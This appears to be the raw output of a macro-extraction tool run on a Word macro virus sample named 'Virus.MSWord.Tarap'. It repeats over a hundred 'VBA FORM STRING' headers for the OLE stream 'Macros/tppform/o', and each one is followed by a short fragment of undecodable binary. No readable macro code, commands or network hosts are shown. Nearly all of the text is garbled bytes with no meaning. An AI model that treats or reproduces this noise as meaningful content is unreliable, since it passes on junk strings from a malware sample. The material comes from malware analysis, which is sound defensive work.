-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��̚dF' �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ZD.๞F����<[��V`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�BE���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6��0'�MZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_3vP�F�GM���<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I8>*�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��XL
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ͱ���J�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zť��rxoZ�������P26B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/�_ٛ����g�>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�w����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�Bq�Qц|o��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>&�Ƒ�	�j�<a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'B��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���rs��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����+�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�5vKwԴ�ֹ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Qޫ���6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S P�YJ���靥Nr
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=G<W7�wا��O�\f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d9��
��I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
j�H�o,z|��i��D�L
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�U��%]�����k��\�h���K	X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1��#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F���y�Yc�$w�E`
H[qoݒN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�*{�+۸�I'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L���Ry{J�S��g;I+�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��G��
�~��O�����,/��W}˥鄒�-�/.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�la�7?ľ���.|S��)�T�՝�P����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��`��̸
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d嗐H<މ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h*Y�>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����_h�ʲ�#|�C�u8��a�G�.�9�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��x�%�*E� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IV.�e
IU
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��3�:/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�h�1�ֳ����"c�B�xP�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?��n��z�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u���N�Is�L�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y$��щD�!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��ភ�x��}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�Yo�@ֲ�^�T4Ђr
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��xolu�
�[�=�v�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4���j��3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8*NO
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���K\�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5?	��M��}y<���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xن�6��YG񿂴�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k��A�3Ú��:u�Οf-�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.Ÿ�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�c^���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�=*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�sjsY��eāBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ω
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�vq��?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6����t�|A�E-湐�򑺇�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�~#|#��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;\��{�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mr�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-ē���^�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3O�_�To���ˍ{�v7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n���+���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��o�qi�x7�ZL�n���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;đ1b�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڎ�mu5���n[Ov��#;F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�r	�dr3��y�Y>�q=¾�l��I�;xD�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6u�%\��i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
''��y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vz�̆ɚ%y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k!v��
���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�j^$��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������P�-�ڂ�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
痂�U��ck�C}�^�=���r%E�S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~If�/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9���f��[��^%��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���msH���B�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dD.��`H\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*JW��?���?ٻ��/�_�Wz��4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[ӷ>|y�]�H�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c��2��UԔ\�6��I.�+O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�ya�B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>c��6�/u}2�;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e��n�M�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>��$��y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ƈ�'�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xC�1ݍ/�Tw�N��
4�|���Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�u�6��s!�6��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!���a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�߂�֚v���m��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���V�Dэ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�A'w9f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����2�M��͇V	-�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��YF��,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2���3�S���߄?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<M�fo�xg�B�֔"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!,A�ÁKW�?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l4�gῊl4�A��8%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��u�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�p�W��/4��v�V��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�o�2�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'y=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ns�O��.�i��ϩ�:f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]��̬�[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3mn
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�޹����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)�K�����iw�,���/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/_�|2��_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|c����=�%���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�UZ�x��P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]�{62
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m�\�>��V����������v�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Gc#����'��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~Ӻ,:��b��V/.�/����ؓ.�,�0܀F�`�خ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �1�j��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.����%hm��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
46S������5`�r�w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��i��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I>�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~V�
��^U�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�W���> �MA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
